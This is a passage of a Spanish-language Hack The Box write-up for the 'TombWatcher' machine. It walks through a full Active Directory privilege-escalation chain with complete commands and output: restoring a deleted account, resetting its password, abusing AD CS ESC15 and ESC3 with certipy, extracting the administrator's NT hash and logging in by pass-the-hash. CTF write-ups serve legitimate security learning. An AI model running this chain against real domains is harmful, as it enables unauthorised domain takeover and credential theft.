┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ evil-winrm -i 10.129.232.167 -u 'john' -p 'passwordjohn'


*Evil-WinRM* PS C:\Users\john\Documents> whoami
tombwatcher\john
*Evil-WinRM* PS C:\Users\john\Documents> type C:\Users\john\Desktop\user.txt
be614dda5b86af462047c7123d1771fc
```
### Análisis de certificados.

Dentro del sistema realice una enumeracion manual pero no encontré mucha cosa.

Por lo cual me decidí por a enumerar los certificados

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher/loot]
└─$ certipy-ad find -u john -p passwordjohn -target 10.129.232.167
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving text output to '20260107112642_Certipy.txt'
[*] Wrote text output to '20260107112642_Certipy.txt'
[*] Saving JSON output to '20260107112642_Certipy.json'
[*] Wrote JSON output to '20260107112642_Certipy.json'
```

Analice rápidamente el output para ver si encontraba algo raro.

```txt
  17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```

Existía un SID raro: **S-1-5-21-1392491010-1358638721-2126982587-1111** usualmente, cuando se muestra un SID en vez del nombre es por que el objeto fue borrado.

Podemos ver las propiedades de este SID de la siguiente manera:

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties * -IncludeDeletedObjects


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

- Vemos que se trataba de un usuario llamado cert_admin y también podemos ver su ubicación OU=ADCS,DC=tombwatcher,DC=htb

Voy a restaurar al usuario cert_admin pasándole su GUID y le voy a cambiar su contraseña a passwordcert.

```bash
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "passwordcert" -AsPlainText -Force)
```

Podemos comprobar que si funciono a traves del SMB.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ nxc smb 10.129.232.167 -u 'cert_admin' -p 'passwordcert'

SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\cert_admin:passwordcert
```

Devuelta a bloodhound podemos ver que el usuario john tiene permisos **GenericAll** sobre el **ADCS** que es donde se encuentra **cert_admin**.

![](assets/Pasted%20image%2020260107013833.png)

- **Active Directory Certificate Services (AD CS)**: Es el sistema que se encarga de emitir y gestionar los certificados.

!!! info
    - Podemos pensar en los certificados como credenciales para autenticarnos sin necesidad de contraseñas.
    - Cada certificado esta definido por una plantilla que basicamente definen reglas y configuraciones como: Quien puede solicitar el certificado, Para que se puede usar el certificado, Quien aprueba la solicitud y Que informacion debe de contener el certificado.

### Abusando de ESC15 y ESC3

Con `certipy` podemos tratar volver a enumerar los certificados vulnerables pero ahora como el usuario cert_admin.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ certipy-ad find -u 'cert_admin' -p 'passwordcert' -dc-ip 10.129.232.167 -stdout -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Por ejemplo, en este caso hay una plantilla Vulnerable **WebServer** que podemos resumir a esta informacion.

```
Nombre de Plantilla: WebServer
Autoridad Certificadora: tombwatcher-CA-1
Puede solicitarla: cert_admin, Domain Admins, Enterprise Admins
Sirve para: 
  - Server Authentication (autenticar servidores web)
  - NO tiene Client Authentication (iniciar sesión como usuario)
Información que contiene:
  - Enrollee Supplies Subject: TRUE ← PROBLEMA
  - El solicitante escribe su propio nombre/identidad
Vulnerable a ESC15
Aprobación: Automática (no requiere manager)
```

En este caso vamos a abusar de ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu"):  [CertipyPrivEsc](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).

- En resumidas cuentas la vulnerabilidad nos permite inyectar Application Policies a nuestro certificado

!!! info
    Las **Application Policies** (también llamadas **Extended Key Usage – EKU**) indican:
    > **Para qué puede usarse un certificado**.
    > No dicen _quién_ es el usuario, sino **qué tipo de autenticación o acción está permitida** con ese cert.
    > Técnicamente son **OIDs** dentro del certificado.

El primer paso consiste en solicitar un certificado inyectando una política que nos convierte en **Enrollment Agent** lo que nos permitirá pedir certificados para otros usuarios.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'passwordcert' \
    -dc-ip '10.129.232.167' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

Y ahora vamos aprovecharnos de ESC3: Enrollment Agent Certificate Template  [CertipyPrivEsc](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).

- En resumidas cuentas la ESC3 hace uso de los **Enrollment Agents** que son usados para emitir certificados para otros usuarios. Este es un permiso legitimo, pero si el atacante logra tenerlo va a poder emitir certificados para otros usuarios.

En nuestro caso ya tenemos un certificado que nos convierte en **Enrollment Agents** por lo cual solo es cuestión de pedir un nuevo certificado para el usuario administrator.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'passwordcert' \
    -target 'DC01.tombwatcher.htb' -dc-ip 10.129.232.167 \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\administrator'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Ahora con dicho certificado podemos obtener un TGT para el usuario administrator.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.232.167'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

Con ese hash nos podemos autenticar via Winrm y thats it.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ evil-winrm -i 10.129.232.167 -u 'administrator' -H 'f61db423bebe3328d33af26741afe5fc'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
tombwatcher\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
08addef34dd703cd701f04c73c962593
```


***PWNED***

![](assets/Pasted%20image%2020260107023326.png)



